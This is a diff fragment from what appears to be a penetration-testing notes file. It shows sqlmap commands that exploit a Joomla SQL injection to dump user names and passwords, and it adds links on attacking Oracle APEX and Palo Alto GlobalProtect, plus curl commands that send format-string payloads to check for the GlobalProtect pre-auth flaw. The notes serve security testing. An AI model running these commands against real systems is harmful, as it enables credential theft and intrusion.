@@ -805,3 +805,15 @@ sqlmap -u "http://<ip>/index.php?option=com_fields&view=fields&layout=modal&list
 
 sqlmap -u "http://<ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' -C name,password --dump --batch
 ```
+
+### pentesting apex
+https://www.neooug.org/gloc/Presentations/2018/SpendoliniHacking%20Oracle%20APEX.pdf
+
+### Safely testing for Palo Alto Global Protect Preauth RCE / DoS
+http://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
+
+```
+time curl -s -d 'scep-profile-name=%9999999c' https://localhost/sslmgr >/dev/null
+time curl -s -d 'scep-profile-name=%99999999c' https://localhost/sslmgr >/dev/null
+time curl -s -d 'scep-profile-name=%999999999c' https://localhost/sslmgr >/dev/null
+```
